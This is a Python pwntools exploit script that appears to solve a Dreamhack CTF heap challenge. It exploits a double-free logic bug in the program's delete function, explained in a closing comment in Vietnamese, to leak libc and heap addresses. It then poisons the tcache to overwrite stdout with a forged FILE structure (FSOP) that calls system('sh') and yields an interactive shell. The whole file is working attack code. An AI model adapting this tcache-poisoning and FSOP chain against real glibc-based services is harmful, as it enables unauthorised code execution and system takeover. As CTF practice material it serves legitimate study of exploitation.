#!/usr/bin/python3
from pwn import * 

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000001422
		brva 0x0000000000001619
		b* _IO_wfile_overflow
		c
		''')

if args.REMOTE:
	HOST = "host8.dreamhack.games"
	PORT = 22637
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def create(idx, size, name, content):
	sla(b'> ', b'1')
	san(b'idx > ', idx)
	san(b'size > ', size)
	sa(b'name > ', name)
	sa(b'content > ', content)
def create1(idx, size, name):
	sla(b'> ', b'1')
	san(b'idx > ', idx)
	san(b'size > ', size)
	sa(b'name > ', name)
def delete(idx):
	sla(b'> ', b'2')
	slan(b'idx > ', idx)
def edit(idx, name, content):
	sla(b'> ', b'3')
	san(b'idx > ', idx)
	sa(b'name > ', name)
	sa(b'content > ', content)
def show(idx):
	sla(b'> ', b'4')
	slan(b'idx > ', idx)
def quit(idx):
	sla(b'> ', b'5')
#GDB()
input("Stage 1: Leak libc")
create(0, 0x500, b'A', b'A')
create(1, 0x20, b'A', b'A')
delete(0)
delete(0)
show(0)
ru(b'name : ')
libc.address = leak(r(6), 0x21ace0)
info("Libc base : " ,libc.address)
ru(b'content : ')
heap_base = leak(r(5)) << 12
info("Heap Base : ", heap_base)
input("Stage 2: FSOP")
stdout = libc.sym._IO_2_1_stdout_
target = ((heap_base + 0x3e0) >> 12) ^ (stdout)
temp = ((heap_base + 0x2d0) >> 12) ^ (heap_base + 0x720)
create(1, 0x300, b'A', b'A')
create(2, 0x300, b'A', b'A')
delete(2)
delete(1)
delete(1)
edit(1, p64(target), p64(temp))
create(2, 0x300, p64(libc.sym.system) + p64(heap_base + 0x3e0 - 0x68), b'A')
pld = b'\x01\x01;sh;\x00\x00'
pld = pld.ljust(0x88, b'\x00') + p64(heap_base + 0x400)
pld = pld.ljust(0xa0, b'\x00') + p64(heap_base + 0x3e8 - 0xe0)
pld = pld.ljust(0xd8, b'\x00') + p64(libc.sym._IO_wfile_jumps - 0x20)
create1(1, 0x300, pld)
p.interactive()
# lỗi logic ở cuối hàm delete
# khi delete 2 lần thì nó sẽ gán thằng check_deleted = 0 (tức là note vẫn tồn tại và vẫn free được)